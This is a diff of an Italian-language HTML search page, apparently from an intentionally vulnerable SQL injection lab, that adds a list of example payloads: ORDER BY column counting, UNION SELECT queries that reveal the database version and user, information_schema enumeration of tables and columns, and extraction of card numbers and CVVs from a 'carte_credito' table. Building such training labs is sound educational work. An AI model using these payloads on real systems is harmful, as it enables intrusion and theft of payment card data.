@@ -16,7 +16,14 @@
     <input name="user" placeholder="Inserisci username" autocomplete="off" />
     <button type="submit">Cerca</button>
   </form>
-  <p style="color:#666">Esempio UNION (esfiltrazione): <code>' UNION SELECT 1, username, password FROM users -- </code></p>
+  <p style="color:#666">Esempi payload (campo ricerca):</p>
+  <ul style="color:#666">
+    <li>Conta colonne: <code>' ORDER BY 4 -- </code> (errore) poi <code>' ORDER BY 3 -- </code> (ok)</li>
+    <li>Versione/utente/DB: <code>' UNION SELECT @@version, current_user(), database() -- </code></li>
+    <li>Enumera tabelle: <code>' UNION SELECT table_name, table_schema, 1 FROM information_schema.tables WHERE table_schema=database() -- </code></li>
+    <li>Enumera colonne: <code>' UNION SELECT column_name, data_type, 1 FROM information_schema.columns WHERE table_name='carte_credito' -- </code></li>
+    <li>Esfiltra carte: <code>' UNION SELECT numero, cvv, intestatario FROM carte_credito -- </code></li>
+  </ul>
   <button><a style="color: white; text-decoration: none;" href="/logout">Logout</a></button>
 </body>
 </html>
